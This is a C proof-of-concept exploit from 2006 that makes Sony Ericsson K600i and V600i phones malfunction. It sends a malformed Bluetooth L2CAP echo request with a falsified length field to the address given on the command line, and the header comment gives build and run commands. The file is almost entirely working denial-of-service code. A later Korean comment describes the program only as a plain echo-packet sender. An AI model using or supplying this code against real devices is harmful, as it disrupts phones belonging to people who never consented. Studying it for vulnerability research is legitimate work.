/*	Sony/Ericsson K600i reset display - PoC			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	02-01-2006						*/
/*	Vulnerability found using BSS fuzzer :			*/
/*		http://securitech.homeunix.org/blue/		*/
/*								*/
/*	Causes anormal behaviours on some Sony/Ericsson 	*/
/*	cell phones 						*/
/*	Vulnerable tested devices :				*/
/*		- K 600i					*/
/*		- V 600i					*/
/*		- And maybe other ones... 			*/
/*								*/
/*	Vulnerable devices will slowly turn their screen into 	*/
/*	black and then display a white screen. 			*/
/*	After a short period (~45sec), they will go back to 	*/
/*	their normal behaviour					*/
/*								*/
/*	gcc -lbluetooth reset_display_K600i.c 			*/
/*		-o reset_display_K600i				*/
/*	./reset_display_K600i 00:12:EE:XX:XX:XX			*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

/**
 * main - Bluetooth L2CAP 커넥션을 통해 데이터를 송신하는 기능을 수행하는 프로그램
 * 
 * @argc: 명령 줄 인자(argument) 개수
 * @argv: 명령 줄 인자 값을 포함하는 문자열 배열
 * 
 * 프로그램은 명령 줄 인자로 주어진 Bluetooth 주소로 L2CAP 커넥션을 설정하고,
 * Echo 요청 패킷을 송신하며, 송신된 패킷의 내용을 출력한다.
 * 
 * 작업순서:
 * 1. 명령 줄 인자로 Bluetooth 주소를 받음
 * 2. Bluetooth 소켓 생성
 * 3. 소켓을 bind()로 바인딩
 * 4. 입력 받은 Bluetooth 주소로 커넥트
 * 5. 패킷을 위한 메모리 할당
 * 6. Echo 요청 패킷을 작성
 * 7. 패킷 송신 후, 송신된 패킷 출력
 * 8. 자원 해제 및 소켓 닫기
 *
 * 올바른 사용법은: <프로그램 이름> <Bluetooth 주소>
 */

int main(int argc, char **argv)
{
	char *packet_buffer;
	l2cap_cmd_hdr *cmd_header;	
	struct sockaddr_l2 l2cap_address;
	int socket_fd, bytes_sent, index;

	if(argc < 2)
	{
		fprintf(stderr, "%s <btaddr>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if ((socket_fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&l2cap_address, 0, sizeof(l2cap_address));
	l2cap_address.l2_family = AF_BLUETOOTH;

	if (bind(socket_fd, (struct sockaddr *) &l2cap_address, sizeof(l2cap_address)) < 0) 
	{
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(argv[1], &l2cap_address.l2_bdaddr);
	
	if (connect(socket_fd, (struct sockaddr *) &l2cap_address, sizeof(l2cap_address)) < 0) 
	{
		perror("connect");
		exit(EXIT_FAILURE);
	}
	
	if(!(packet_buffer = (char *) malloc ((int) SIZE + 1))) 
	{
		perror("malloc");
		exit(EXIT_FAILURE);
	}
	
	memset(packet_buffer, 'A', SIZE);

	cmd_header = (l2cap_cmd_hdr *) packet_buffer;
	cmd_header->code = L2CAP_ECHO_REQ;
	cmd_header->ident = 1;
	cmd_header->len = FAKE_SIZE;
	
	if( (bytes_sent = send(socket_fd, packet_buffer, SIZE, 0)) >= 0)
	{
		printf("L2CAP packet sent (%d)\n", bytes_sent);
	}

	printf("Buffer:\t");
	for(index = 0; index < bytes_sent; index++)
		printf("%.2X ", (unsigned char) packet_buffer[index]);
	printf("\n");

	free(packet_buffer);
	close(socket_fd);
	return EXIT_SUCCESS;
}
